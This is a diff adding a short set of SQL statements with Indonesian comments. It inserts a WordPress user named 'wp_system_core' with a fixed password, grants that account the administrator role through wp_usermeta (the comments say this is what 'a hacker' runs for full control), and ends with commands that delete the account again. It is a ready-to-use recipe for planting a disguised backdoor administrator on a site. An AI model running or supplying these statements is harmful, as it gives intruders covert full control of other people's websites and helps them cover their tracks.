@@ -1,0 +1,17 @@
+INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_registered, user_status, display_name) 
+VALUES ('wp_system_core', MD5('Codex12345!'), 'System Core', 'system@shoetowngrou.co.id', NOW(), 0, 'System Core');
+
+____________________________________________________
+ubah jadi full controll
+Misalkan setelah perintah INSERT INTO wp_users yang pertama tadi dijalankan, database secara otomatis memberikan nomor ID = 99 untuk user wp_system_core.
+
+Hacker cukup menjalankan satu perintah SQL lanjutan ini untuk menyuntikkan jabatan Administrator:
+
+SQL
+INSERT INTO wp_usermeta (user_id, meta_key, meta_value) 
+VALUES (99, 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}');
+
+___________________________________________________
+hapus akun wajib
+DELETE FROM wp_users WHERE ID = 99;
+DELETE FROM wp_usermeta WHERE user_id = 99;
